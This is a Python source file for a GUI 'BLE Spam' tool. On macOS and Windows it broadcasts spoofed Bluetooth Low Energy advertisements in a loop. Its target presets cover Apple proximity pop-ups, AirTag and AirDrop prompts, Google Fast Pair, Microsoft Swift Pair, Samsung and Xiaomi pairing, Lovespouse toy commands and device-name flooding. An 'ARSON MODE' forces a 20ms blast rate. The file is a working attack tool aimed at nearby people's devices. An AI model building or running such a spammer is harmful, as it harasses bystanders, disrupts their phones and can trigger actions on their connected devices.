"""
BLE Spam - macOS GUI Application
tkinter-based GUI wrapper for the BLE Spam engine.
"""

import os
import sys
import time
import struct
import random
import threading
import platform
import tkinter as tk
from tkinter import ttk

# ---------------------------------------------------------------------------
# PyInstaller / import support
# ---------------------------------------------------------------------------
if getattr(sys, "frozen", False):
    _bundle_dir = getattr(sys, "_MEIPASS", os.path.dirname(sys.executable))
    if _bundle_dir not in sys.path:
        sys.path.insert(0, _bundle_dir)
else:
    _script_dir = os.path.dirname(os.path.abspath(__file__))
    if _script_dir not in sys.path:
        sys.path.insert(0, _script_dir)

from payloads import ALL_GENERATORS

SYSTEM = platform.system()

# ============================================================
# BLE Advertisers (same as ble_spam.py)
# ============================================================

class BLEAdvertiser:
    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        raise NotImplementedError
    def stop(self):
        raise NotImplementedError


class MacOSAdvertiser(BLEAdvertiser):
    def __init__(self):
        import objc
        objc.loadBundle('IOBluetooth',
            bundle_path='/System/Library/Frameworks/IOBluetooth.framework',
            module_globals=globals())
        self.hc = IOBluetoothHostController.defaultController()  # noqa: F821
        if self.hc is None or self.hc.powerState() != 1:
            raise RuntimeError("Bluetooth not available or not powered on")
        self._advertising = False

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        ad_bytes = b""
        if manufacturer_id is not None and data is not None:
            mfr_bytes = struct.pack("<H", manufacturer_id) + data
            ad_bytes = bytes([len(mfr_bytes) + 1, 0xFF]) + mfr_bytes
        elif service_uuid and service_data is not None:
            import uuid as _uuid
            uuid_obj = _uuid.UUID(service_uuid)
            uuid_int = uuid_obj.int
            base = _uuid.UUID("00000000-0000-1000-8000-00805F9B34FB").int
            extracted_16 = (uuid_int >> 96) & 0xFFFF
            reconstructed = base | (extracted_16 << 96)
            if reconstructed == uuid_int:
                uuid_bytes = struct.pack("<H", extracted_16)
                svc_payload = uuid_bytes + service_data
                ad_bytes = bytes([len(svc_payload) + 1, 0x16]) + svc_payload
            else:
                uuid_bytes = uuid_obj.bytes_le
                svc_payload = uuid_bytes + service_data
                ad_bytes = bytes([len(svc_payload) + 1, 0x21]) + svc_payload
        if not ad_bytes:
            return
        if len(ad_bytes) > 31:
            ad_bytes = ad_bytes[:31]
        padded = ad_bytes + bytes(31 - len(ad_bytes))
        if self._advertising:
            self.hc.BluetoothHCILESetAdvertiseEnable_(0)
        self.hc.BluetoothHCILESetAdvertisingData_advertsingData_(len(ad_bytes), padded)
        self.hc.BluetoothHCILESetAdvertiseEnable_(1)
        self._advertising = True

    def stop(self):
        if self._advertising:
            self.hc.BluetoothHCILESetAdvertiseEnable_(0)
            self._advertising = False


class WindowsAdvertiser(BLEAdvertiser):
    def __init__(self):
        import winrt.windows.devices.bluetooth.advertisement as ble_adv
        import winrt.windows.storage.streams as streams
        self.ble_adv = ble_adv
        self.streams = streams
        self.publisher = None

    def start(self, manufacturer_id=None, data=None,
              service_uuid=None, service_data=None, interval_ms=100):
        self.stop()
        self.publisher = self.ble_adv.BluetoothLEAdvertisementPublisher()
        adv = self.publisher.advertisement
        if manufacturer_id is not None and data is not None:
            mfr = self.ble_adv.BluetoothLEManufacturerData()
            mfr.company_id = manufacturer_id
            writer = self.streams.DataWriter()
            for b in data:
                writer.write_byte(b)
            mfr.data = writer.detach_buffer()
            adv.manufacturer_data.append(mfr)
        if service_uuid and service_data is not None:
            import uuid as _uuid
            sd = self.ble_adv.BluetoothLEAdvertisementDataSection()
            uuid_obj = _uuid.UUID(service_uuid)
            uuid_int = uuid_obj.int
            base = _uuid.UUID("00000000-0000-1000-8000-00805F9B34FB").int
            extracted_16 = (uuid_int >> 96) & 0xFFFF
            reconstructed = base | (extracted_16 << 96)
            writer = self.streams.DataWriter()
            if reconstructed == uuid_int:
                sd.data_type = 0x16
                for b in struct.pack("<H", extracted_16):
                    writer.write_byte(b)
            else:
                sd.data_type = 0x21
                for b in uuid_obj.bytes_le:
                    writer.write_byte(b)
            for b in service_data:
                writer.write_byte(b)
            sd.data = writer.detach_buffer()
            adv.data_sections.append(sd)
        self.publisher.start()

    def stop(self):
        if self.publisher:
            try:
                self.publisher.stop()
            except Exception:
                pass
            self.publisher = None


def get_advertiser():
    if SYSTEM == "Darwin":
        return MacOSAdvertiser()
    elif SYSTEM == "Windows":
        return WindowsAdvertiser()
    else:
        raise RuntimeError(f"GUI mode unsupported on {SYSTEM}")


# ============================================================
# Target groups
# ============================================================

TARGET_GROUPS = {
    "Apple (All)": [
        "apple_new_device", "apple_not_your_device",
        "apple_new_airtag", "apple_action_modal",
        "apple_airdrop", "apple_airplay_target",
        "apple_handoff", "apple_tethering_source",
        "apple_nearby_info",
    ],
    "Apple - New Device": ["apple_new_device"],
    "Apple - Not Your Device": ["apple_not_your_device"],
    "Apple - AirTag": ["apple_new_airtag"],
    "Apple - Action Modal": ["apple_action_modal"],
    "Apple - AirDrop": ["apple_airdrop"],
    "Apple - AirPlay": ["apple_airplay_target"],
    "Apple - Handoff": ["apple_handoff"],
    "Apple - Tethering": ["apple_tethering_source"],
    "Apple - Nearby Info": ["apple_nearby_info"],
    "Google Fast Pair": [
        "google_fast_pair", "google_fast_pair_debug",
        "google_fast_pair_non_production", "google_fast_pair_phone_setup",
    ],
    "Microsoft Swift Pair": ["microsoft_swift_pair", "microsoft_swift_pair_headphone"],
    "Samsung Buds": ["samsung_buds"],
    "Samsung Watch": ["samsung_watch"],
    "Lovespouse Play": ["lovespouse_play"],
    "Lovespouse Stop": ["lovespouse_stop"],
    "Xiaomi QuickConnect": ["xiaomi_quickconnect"],
    "NameFlood": ["nameflood"],
    "Kitchen Sink (All)": list(ALL_GENERATORS.keys()),
    "ARSON MODE (20ms blast)": list(ALL_GENERATORS.keys()),
}


# ============================================================
# GUI Application
# ============================================================

class BLESpamApp:
    def __init__(self, root: tk.Tk):
        self.root = root
        self.root.title("BLE Spam")
        self.root.geometry("480x520")
        self.root.resizable(False, False)

        self.running = False
        self.advertiser = None
        self.thread = None
        self.count = 0

        self._build_ui()
        self._init_ble()

    def _build_ui(self):
        # --- Header ---
        header = tk.Frame(self.root, bg="#1a1a2e", height=50)
        header.pack(fill=tk.X)
        header.pack_propagate(False)
        tk.Label(header, text="BLE Spam", font=("Helvetica", 18, "bold"),
                 fg="#e94560", bg="#1a1a2e").pack(pady=10)

        # --- Main content ---
        main = tk.Frame(self.root, padx=20, pady=10)
        main.pack(fill=tk.BOTH, expand=True)

        # Status
        self.status_var = tk.StringVar(value="Initializing...")
        tk.Label(main, textvariable=self.status_var,
                 font=("Helvetica", 11), fg="#555").pack(anchor=tk.W, pady=(0, 10))

        # Target selector
        tk.Label(main, text="Target:", font=("Helvetica", 12, "bold")).pack(anchor=tk.W)
        self.target_var = tk.StringVar(value="Kitchen Sink (All)")
        target_combo = ttk.Combobox(main, textvariable=self.target_var,
                                     values=list(TARGET_GROUPS.keys()),
                                     state="readonly", width=35)
        target_combo.pack(anchor=tk.W, pady=(2, 10))

        # Interval slider
        tk.Label(main, text="Interval (ms):", font=("Helvetica", 12, "bold")).pack(anchor=tk.W)
        interval_frame = tk.Frame(main)
        interval_frame.pack(anchor=tk.W, fill=tk.X, pady=(2, 10))
        self.interval_var = tk.IntVar(value=100)
        self.interval_slider = tk.Scale(interval_frame, from_=20, to=2000,
                                         orient=tk.HORIZONTAL, variable=self.interval_var,
                                         length=300, showvalue=True)
        self.interval_slider.pack(side=tk.LEFT)

        # Count display
        count_frame = tk.Frame(main)
        count_frame.pack(fill=tk.X, pady=(5, 10))
        tk.Label(count_frame, text="Packets sent:", font=("Helvetica", 12)).pack(side=tk.LEFT)
        self.count_var = tk.StringVar(value="0")
        tk.Label(count_frame, textvariable=self.count_var,
                 font=("Helvetica", 14, "bold"), fg="#e94560").pack(side=tk.LEFT, padx=10)

        # Current payload
        self.payload_var = tk.StringVar(value="")
        tk.Label(main, textvariable=self.payload_var,
                 font=("Helvetica", 10), fg="#888").pack(anchor=tk.W)

        # --- Buttons ---
        btn_frame = tk.Frame(main)
        btn_frame.pack(pady=20)

        self.start_btn = tk.Button(btn_frame, text="Start", font=("Helvetica", 14, "bold"),
                                    bg="#e94560", fg="white", width=12, height=2,
                                    command=self._toggle, relief=tk.FLAT)
        self.start_btn.pack()

        # Log area
        tk.Label(main, text="Log:", font=("Helvetica", 10, "bold")).pack(anchor=tk.W)
        self.log_text = tk.Text(main, height=5, font=("Courier", 9), state=tk.DISABLED,
                                 bg="#f5f5f5", relief=tk.SUNKEN)
        self.log_text.pack(fill=tk.X)

    def _log(self, msg):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, msg + "\n")
        self.log_text.see(tk.END)
        # Keep max 100 lines
        lines = int(self.log_text.index("end-1c").split(".")[0])
        if lines > 100:
            self.log_text.delete("1.0", f"{lines - 100}.0")
        self.log_text.config(state=tk.DISABLED)

    def _init_ble(self):
        def init():
            try:
                self.advertiser = get_advertiser()
                self.root.after(0, lambda: self.status_var.set("Ready - Bluetooth ON"))
                self.root.after(0, lambda: self._log("BLE initialized successfully"))
            except Exception as e:
                self.root.after(0, lambda: self.status_var.set(f"Error: {e}"))
                self.root.after(0, lambda: self._log(f"BLE init failed: {e}"))

        threading.Thread(target=init, daemon=True).start()

    def _toggle(self):
        if self.running:
            self._stop()
        else:
            self._start()

    def _start(self):
        if self.advertiser is None:
            self.status_var.set("BLE not ready")
            return

        self.running = True
        self.count = 0
        self.count_var.set("0")
        self.start_btn.config(text="Stop", bg="#333")
        self.status_var.set("Transmitting...")

        target = self.target_var.get()
        keys = TARGET_GROUPS.get(target, list(ALL_GENERATORS.keys()))
        # Arson mode forces 20ms interval
        if "ARSON" in target:
            self.interval_var.set(20)
            self._log(f"*** ARSON MODE ACTIVATED ***")
        self._log(f"Started: {target}")

        self.thread = threading.Thread(target=self._spam_loop, args=(keys,), daemon=True)
        self.thread.start()

    def _stop(self):
        self.running = False
        if self.advertiser:
            self.advertiser.stop()
        self.start_btn.config(text="Start", bg="#e94560")
        self.status_var.set(f"Stopped (sent: {self.count})")
        self._log(f"Stopped. Total: {self.count}")

    def _spam_loop(self, keys):
        while self.running:
            key = random.choice(keys)
            gen_func = ALL_GENERATORS.get(key)
            if gen_func is None:
                continue

            result = gen_func()
            interval = self.interval_var.get()

            try:
                if key.startswith("google_fast_pair"):
                    svc_uuid, svc_data = result
                    self.advertiser.start(service_uuid=svc_uuid, service_data=svc_data,
                                          interval_ms=interval)
                else:
                    mfr_id, payload = result
                    self.advertiser.start(manufacturer_id=mfr_id, data=payload,
                                          interval_ms=interval)
                self.count += 1
                self.root.after(0, lambda c=self.count: self.count_var.set(str(c)))
                self.root.after(0, lambda k=key: self.payload_var.set(f"[{k}]"))
            except Exception as e:
                self.root.after(0, lambda e=e: self._log(f"Error: {e}"))

            time.sleep(interval / 1000.0)
            self.advertiser.stop()

    def on_close(self):
        self.running = False
        if self.advertiser:
            self.advertiser.stop()
        self.root.destroy()


def main():
    root = tk.Tk()
    app = BLESpamApp(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()


if __name__ == "__main__":
    main()
